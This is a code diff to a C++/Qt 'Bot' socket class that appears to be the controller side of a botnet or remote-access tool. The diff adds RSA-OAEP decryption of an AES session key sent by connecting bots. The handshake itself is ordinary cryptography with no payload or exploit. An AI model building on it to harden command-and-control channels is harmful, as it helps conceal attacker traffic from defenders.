@@ -1,10 +1,11 @@
 #include "bot.h"
 
-Bot::Bot(qintptr handle, QObject *parent): QTcpSocket(parent) {
+Bot::Bot(qintptr handle, RSA::PrivateKey *key, QObject *parent): QTcpSocket(parent), privateKey(key) {
     setSocketDescriptor(handle);
     QObject::connect(this, SIGNAL(disconnected()), this, SLOT(deleteLater()));
 
     QTimer::singleShot(1000, this, SLOT(initAES()));
+    initRSA();
 }
 
 Bot::~Bot() {
@@ -13,6 +14,10 @@ Bot::~Bot() {
 
 void Bot::initAES() {
     QByteArray data = readAll();
+    data = QByteArray::fromBase64(data);
+
+    data = decryptRSA(data);
+
     if (data.size() != AES::DEFAULT_KEYLENGTH + AES::BLOCKSIZE) {
         qDebug() << "not a good bot";
         deleteLater();
@@ -68,4 +73,21 @@ void Bot::safeWrite(QByteArray data) {
 
 QByteArray Bot::getCWD() {
     return currentDirectory.toUtf8();
+}
+
+void Bot::initRSA() {
+    RSAdecryptor = new RSAES_OAEP_SHA_Decryptor(*privateKey);
+}
+
+QByteArray Bot::decryptRSA(QByteArray text) {
+    string txt;
+    for (int i = 0; i < text.size(); i++)
+        txt.push_back(text[i]);
+
+    string res;
+    StringSource(txt, true,
+        new PK_DecryptorFilter(rng, *RSAdecryptor,
+            new StringSink(res)));
+
+    return QByteArray(res.c_str(), res.size());
 }
